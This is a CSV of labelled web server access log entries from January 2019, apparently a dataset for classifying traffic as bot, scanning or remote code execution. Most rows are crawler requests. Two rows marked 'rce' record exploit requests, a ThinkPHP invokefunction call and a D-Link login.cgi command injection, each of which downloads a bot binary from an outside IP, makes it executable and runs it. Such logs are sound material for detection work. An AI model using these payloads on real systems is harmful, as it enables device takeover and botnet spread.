ip,time,method,url,protocol,status,size,referrer,user_agent,extra,no,label,type
216.244.66.248,2019-01-22 00:27:28+00:00,GET,/robots.txt,HTTP/1.1,301,178,-,"Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)",-,361,1,bot
216.244.66.248,2019-01-22 00:27:30+00:00,GET,/robots.txt,HTTP/1.1,200,64,-,"Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)",-,365,1,bot
74.6.168.162,2019-01-22 00:32:46+00:00,GET,/robots.txt,HTTP/1.1,301,178,-,Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp),-,1892,1,bot
74.6.168.162,2019-01-22 00:32:48+00:00,GET,/robots.txt,HTTP/1.1,200,64,-,Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp),-,1895,1,bot
213.174.147.83,2019-01-22 00:43:08+00:00,GET,/robots.txt,HTTP/1.1,301,178,-,Apache-HttpClient/4.5.3 (Java/1.8.0_101),-,4362,1,bot
213.174.147.83,2019-01-22 00:43:08+00:00,GET,/robots.txt,HTTP/1.1,200,94,-,Apache-HttpClient/4.5.3 (Java/1.8.0_101),-,4363,1,bot
95.216.2.253,2019-01-22 00:49:39+00:00,GET,/robots.txt,HTTP/1.1,200,64,-,Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/),-,5930,1,bot
207.241.231.165,2019-01-22 00:55:10+00:00,GET,/robots.txt,HTTP/1.0,301,178,-,Mozilla/5.0 (compatible; archive.org_bot +http://www.archive.org/details/archive.org_bot),-,7035,1,bot
46.225.135.218,2019-01-22 01:02:10+00:00,GET,/robots.txt,HTTP/1.1,200,94,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",-,8482,1,bot
216.244.66.248,2019-01-22 01:13:22+00:00,GET,/robots.txt,HTTP/1.1,301,178,-,"Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)",-,11816,1,bot
216.244.66.248,2019-01-22 01:13:23+00:00,GET,/robots.txt,HTTP/1.1,200,64,-,"Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)",-,11842,1,bot
144.76.119.99,2019-01-22 01:14:05+00:00,GET,/robots.txt,HTTP/1.1,301,178,-,Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/),-,11990,1,bot
144.76.119.99,2019-01-22 01:14:06+00:00,GET,/robots.txt,HTTP/1.1,200,64,-,Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/),-,11995,1,bot
185.148.3.141,2019-01-22 01:19:25+00:00,GET,/robots.txt,HTTP/1.1,200,94,-,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0,-,13440,1,bot
178.47.232.191,2019-01-22 01:24:22+00:00,GET,/index.php?s=/index/	hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=,'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1,400,166,-,Yowai/2.0,-,14593,1,rce
196.64.216.172,2019-01-22 01:36:13+00:00,GET,/wp-login.php,HTTP/1.1,301,178,-,Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1,-,17533,1,scanning
196.64.216.172,2019-01-22 01:36:14+00:00,GET,/wp-login.php,HTTP/1.1,404,494594,-,Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1,-,17539,1,scanning
199.58.86.211,2019-01-22 01:48:59+00:00,GET,/robots.txt,HTTP/1.1,301,178,-,Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/),-,20096,1,bot
199.58.86.211,2019-01-22 01:49:01+00:00,GET,/robots.txt,HTTP/1.1,200,64,-,Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/),-,20100,1,bot
216.244.66.248,2019-01-22 01:59:45+00:00,GET,/robots.txt,HTTP/1.1,301,178,-,"Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)",-,22930,1,bot
216.244.66.248,2019-01-22 01:59:47+00:00,GET,/robots.txt,HTTP/1.1,200,64,-,"Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)",-,22937,1,bot
95.216.11.34,2019-01-22 02:14:20+00:00,GET,/robots.txt,HTTP/1.1,200,64,-,Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/),-,26863,1,bot
95.216.11.34,2019-01-22 02:24:57+00:00,GET,/robots.txt,HTTP/1.1,200,64,-,Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/),-,29367,1,bot
151.25.29.64,2019-01-22 02:25:47+00:00,GET,/login.cgi?cli=aa aa';wget http://217.61.5.226/bins/Solstice.mips -O -> /tmp/.Solstice;chmod 777 /tmp/.Solstice;/tmp/.Solstice dlink'$,HTTP/1.1,400,166,-,Solstice/2.0,-,29541,1,rce
192.99.55.164,2019-01-22 02:32:25+00:00,GET,/robots.txt,HTTP/1.1,301,178,-,User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0,-,31360,1,bot
